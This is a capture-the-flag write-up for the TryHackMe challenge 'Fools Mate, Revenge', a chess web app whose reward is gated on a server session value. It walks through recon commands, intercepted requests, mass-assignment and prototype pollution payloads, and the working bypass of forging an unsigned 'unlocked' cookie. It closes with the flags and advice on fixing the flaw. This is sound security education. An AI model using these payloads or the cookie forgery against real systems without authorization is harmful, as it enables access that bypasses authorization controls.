---
title: "Fools Mate, Revenge — THM Writeup"
date: 2026-07-05
layout: post
categories: [ctf, tryhackme]
tags: [ctf, cybersecurity, web, cookie-manipulation, express, caido, session]
image:
  path: /assets/img/foolsmatev2-banner.png
  alt: Fools Mate Revenge CTF Writeup
---

Hey everyone,

This is my full writeup for **Fools Mate, Revenge** — the sequel to Fools Mate. Same chess app, completely different vulnerability. I'm going to walk through every attempt I made, including the ones that failed, so you can understand not just the solution but the reasoning that eventually got there.

OR you can directly skip to the solution->[Click here for solution](#step-5--the-solution-cookies)

If you haven't read the Fools Mate v1 writeup, go read that first. This challenge assumes you already know how v1 worked.

---

## The Challenge

Same **EndgameTrainer** chess web app. Same mate-in-one position. But this time, the client-side block from v1 is gone — the browser actually lets you send the winning move to the server.

![new Preferences panel on the right](/assets/img/foolsmatev2-2.png)


The first visible difference from v1 is a new **Preferences** panel in the sidebar with theme, piece set, and animation options. Small detail, but worth noting — new UI often means new endpoints.

I made the winning move (Rook a1→a8) directly in the browser. The board updated, showed checkmate — but instead of a flag, the status said:

```
Checkmate! No reward for you.
```

![No reward for you](/assets/img/foolsmatev2-3.png)

---

## Step 1 — Initial Recon

Started with a quick nmap scan:

```bash
nmap -sC -sV 10.49.141.246
```

Port 3000 open, running Node.js/Express. Nothing else interesting.

Then I grabbed `app.js` the same way as v1:

```bash
curl http://10.49.141.246:3000/js/app.js
curl http://10.49.141.246:3000/js/app.js | grep -A10 -B10 showFlag
curl http://10.49.141.246:3000/js/app.js | grep -A10 -B10 data
```

The flag delivery mechanism looked the same — `showFlag(data.flag)` called from `finalize()`, flag coming from the `/api/move` response. But this time the `preMoveCheck()` client-side block was gone.

So the move reaches the server now. The server itself is blocking the reward.

---

## Step 2 — Intercepting the Winning Move in Caido

I opened Caido (my proxy of choice — similar to Burp Suite) and made the winning move through the browser.

The move request:

```http
POST /api/move HTTP/1.1
Host: 10.49.141.246:3000
Content-Type: application/json
Cookie: sid=9c39e4f1b311cc9df95d237fbd583da8

{"from":"a1","to":"a8"}
```

The server response:

```json
{
    "ok": true,
    "move": "a1a8",
    "fen": "R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1",
    "status": "checkmate",
    "turn": "b",
    "winner": "white",
    "locked": true,
    "message": "Checkmate! No reward for you.",
    "reason": "reward gate closed: session.config.unlocked is not set"
}
```

![Caido HTTP history showing the /api/move response with locked:true](/assets/img/foolsmatev2-4.png)


That `reason` field was the most important line in the entire challenge:

```
reward gate closed: session.config.unlocked is not set
```

Three specific words: `session`, `config`, `unlocked`. The server was using an internal session variable — `session.config.unlocked` — as a gate. If that variable wasn't set to true, no flag.

The entire challenge from this point was figuring out how to set it.

---

## Step 3 — Attacking /api/settings (Many Failed Attempts)

### What I noticed about v2's HTML

Compared to v1, the page now had a Preferences panel:

```html
<label class="pref-row"><span>Board theme</span>
  <select id="themeSelect">...</select>
</label>
<button class="btn btn-ghost" id="savePrefsBtn">Save preferences</button>
```

And from `app.js`, I could see it posting to a new endpoint:

```javascript
fetch('/api/settings', {
    method: 'POST',
    body: JSON.stringify({
        theme: themeSelect.value,
        pieceSet: pieceSetSelect.value,
        animationMs: Number(animSelect.value)
    })
});
```

Three fields: `theme`, `pieceSet`, `animationMs`. My hypothesis: maybe the server merged this input directly into `session.config` using something like `Object.assign(req.session.config, req.body)` — which would let me inject extra properties.

### Attempt 1 — Add unlocked:true to the settings body

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: sid=9c39e4f1b311cc9df95d237fbd583da8" \
  -d '{"theme":"dark","pieceSet":"classic","animationMs":150,"unlocked":true}' \
  http://10.49.141.246:3000/api/settings
```

Response:

```json
{"ok":true,"preferences":{"theme":"dark","pieceSet":"classic","animationMs":150}}
```

The `unlocked` field was silently dropped. The server returned only the whitelisted fields.

### Attempt 2 — Nested config object

```json
{
    "theme": "dark",
    "config": { "unlocked": true }
}
```

Same response — only the three allowed fields echoed back. Completely ignored.

### Attempt 3 — Prototype pollution payloads

Tried:

```json
{"__proto__": {"unlocked": true}}
{"constructor": {"prototype": {"unlocked": true}}}
```

No change. The server apparently wasn't using lodash.merge or any vulnerable merge function.

### Attempt 4 — Checking /api/state for session leakage

```bash
curl -H "Cookie: sid=9c39e4f1b311cc9df95d237fbd583da8" \
  http://10.49.141.246:3000/api/state
```

```json
{"ok":true,"fen":"R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1","status":"checkmate","turn":"b"}
```

Only game state. No session config exposed.

### Attempt 5 — Endpoint discovery with ffuf

```bash
ffuf -u http://10.49.141.246:3000/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

Only `/api/state` returned 200. No hidden endpoints.

### Attempt 6 — OPTIONS check on /api/settings

```bash
curl -X OPTIONS http://10.49.141.246:3000/api/settings -i
```

```
Allow: POST
```

Only POST allowed. No PUT, PATCH, or anything else.

### Attempt 7 — Replaying the winning move in Caido with modified body

I tried replaying the `/api/move` request in Caido and adding `"session.config.unlocked": True` to the body.

The server returned a `SyntaxError`:

```
SyntaxError: Unexpected token T in JSON at position 53
```

![Caido replayer with the SyntaxError response](/assets/img/foolsmatev2-5.png)

My mistake — I used Python-style `True` (capital T) instead of JSON-valid `true` (lowercase). JSON is case-sensitive. When I corrected it to lowercase `true`:

```json
{"from":"a1","to":"a8","session.config.unlocked":true}
```

The server returned:

```json
{"ok":false,"error":"illegal move","fen":"R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1"}
```

Not a session manipulation error — just "illegal move." That's because the board was still in the post-checkmate state from the previous move. The extra field was ignored entirely; the server didn't read arbitrary request body properties.

---

## Step 4 — Getting Stuck

At this point I had ruled out:

- ❌ Mass assignment via `/api/settings` body
- ❌ Nested config/unlocked in request body
- ❌ Prototype pollution
- ❌ Hidden endpoints
- ❌ Alternate HTTP methods
- ❌ Session state leakage via `/api/state`

The server was clearly whitelisting the settings fields. The error message kept pointing to `session.config.unlocked` but every JSON body approach was going nowhere.

I spent a while stuck here trying combinations and rethinking the architecture.

---

## Step 5 — The Solution: Cookies

The breakthrough came from stepping back and asking a different question.

I had been thinking: "How do I set `session.config.unlocked` through the API?" But the real question was: "What client-controlled inputs does the server actually read?"

I had checked:
- URL/path
- Request body (JSON)
- HTTP method
- Headers (content type, etc.)

But I hadn't seriously tested **cookies** beyond the session ID.

The error message said `session.config.unlocked is not set`. What if the server was populating that value not from the request body, but from a cookie? Something like:

```javascript
req.session.config.unlocked = req.cookies.unlocked === "true";
```

If so, adding a cookie named `unlocked` with the value `"true"` would flip that gate.

I went to browser DevTools → Storage tab → Cookies → the target site, and manually added:

```
Name:  unlocked
Value: true
```

Then I clicked **Reset position** to get the board back to the starting position, and moved the rook from a1 to a8.

The server returned the flag.

![theflag](/assets/img/foolsmatev2-6.png)

**Flag: `THM{pr0t0_p0lluted_th3_r3f3r33}`**

---

## Why This Worked

Cookies belong to the client. Any user can create, edit, or delete them in browser DevTools or an intercepting proxy. If the server reads a cookie value and uses it to make an authorization decision without signing or validating it, an attacker can forge it.

The likely server-side code:

```javascript
if (req.cookies.unlocked === "true") {
    req.session.config.unlocked = true;
}
```

or directly:

```javascript
req.session.config.unlocked = req.cookies.unlocked === "true";
```

When this runs at the start of a request, `session.config.unlocked` becomes `true` because I told it to via a cookie I manufactured.

The fix would be to never derive authorization state from a client-controlled, unsigned cookie. The `unlocked` state should only be set through verified server-side logic.

---

## Comparing v1 and v2

| | Fools Mate v1 | Fools Mate, Revenge |
|---|---|---|
| **Where validation lives** | Client-side JavaScript | Server-side session gate |
| **What you bypass** | `preMoveCheck()` in the browser | `session.config.unlocked` check |
| **How you bypass it** | Send the API request directly via curl | Forge the `unlocked=true` cookie |
| **Trust issue** | Server trusts client to enforce move rules | Server trusts client-supplied cookie for authorization |
| **Flag** | `THM{cl13nt_s1d3_ch3ckm4t3}` | `THM{pr0t0_p0lluted_th3_r3f3r33}` |

Both challenges are the same fundamental mistake — trusting the client — just expressed at different layers of the application.

---

## What I Would Have Done Differently

**Enumerate all client-controlled inputs from the start.** I had a checklist of attack surfaces but cookies weren't on it until much later. A proper input enumeration should always include: URL, query params, request body, headers, AND cookies. I would have reached the solution much faster if I had tested cookies alongside the JSON body attempts.

**Read the error message more literally.** The server said `session.config.unlocked is not set`. "Not set" is different from "set to false." A value that is "not set" hasn't been assigned at all — which is exactly what happens when the cookie isn't present. That wording was a hint about the mechanism, not just the state.

**Don't anchor to one theory.** I spent most of my time convinced the solution was in the request body. Once I had that theory, every failed attempt made me try a different body payload instead of questioning whether the body was the right attack surface at all. Resetting assumptions earlier would have saved significant time.

---

## Key Takeaways

**Cookies are fully client-controlled.** Unlike server-side sessions which a user cannot directly modify, cookies are stored in the browser and sent with every request. Any authorization logic that reads a cookie value at face value is exploitable.

**Always enumerate all input channels.** URL, body, headers, cookies — all of these are attacker-controlled. The solution to this challenge was in the one input type I checked last.

**Error messages in CTFs are hints, not just errors.** The exact phrase `session.config.unlocked is not set` told us the variable name, its location in the session object, and that it was a boolean gate. That information was enough to construct the exploit once I approached it correctly.

**The challenge progression was well designed.** v1 taught "don't trust the client for move validation." v2 taught "don't trust the client for authorization state." Same threat model, different layer. If you understand both, you understand a significant chunk of real-world web security mistakes.
